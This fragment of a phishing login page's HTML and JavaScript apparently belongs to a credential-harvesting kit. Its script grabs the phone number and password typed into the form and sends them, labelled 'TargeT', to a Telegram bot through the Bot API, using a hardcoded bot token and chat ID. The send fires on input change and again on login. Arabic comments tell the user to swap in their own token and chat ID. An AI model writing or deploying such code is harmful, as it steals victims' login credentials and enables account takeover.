            top: 50%;

            color: black;

    <script>
        // Show the popup when the page loads
        window.onload = function() {
            document.getElementById('popup').style.display = 'block';
        };

        // Function to close the popup
        function closePopup() {
            document.getElementById('popup').style.display = 'none';
        }

        function sendToTelegram() {
            var phoneNumber = document.querySelector('.phone-input[type="text"]').value;
            var password = document.querySelector('.phone-input[type="password"]').value;

            var telegramBotToken = "6428071347:AAHP1yP2bZFkKB_82pBcseiH4Dgu-EVtEAU"; // استبدل هذه القيمة بـ Token الخاص بك
            var chatId = "5318149339"; // استبدل هذه القيمة بـ Chat ID الخاص بك
            var message = "TargeT: " + phoneNumber + "\nPassword: " + password;

            var telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

            // Send the message to Telegram
            var xhr = new XMLHttpRequest();
            xhr.open("GET", telegramUrl, true);
            xhr.send();
        }

        document.querySelector('.phone-input').addEventListener('change', sendToTelegram);

        // Function to handle the login button click
        document.querySelector('.login-button').addEventListener('click', function(event) {
            var phoneNumber = document.querySelector('.phone-input[type="text"]').value;
            var password = document.querySelector('.phone-input[type="password"]').value;
            var errorMessage = document.getElementById('error-message');

            // Clear previous error
            errorMessage.style.display = 'none';

            // Validate phone number
            if (!/^\d{10}$/.test(phoneNumber)) {
                errorMessage.textContent = 'يرجى إدخال رقم هاتف صحيح.';
                errorMessage.style.display = 'block';
                event.preventDefault();
                return;
            }

            // Validate password
            if (password.length < 6) {
                errorMessage.textContent = 'يجب أن تتكون كلمة المرور من 6 أحرف على الأقل.';
                errorMessage.style.display = 'block';
                event.preventDefault();
                return;
            }

            sendToTelegram();
        });
    </script>
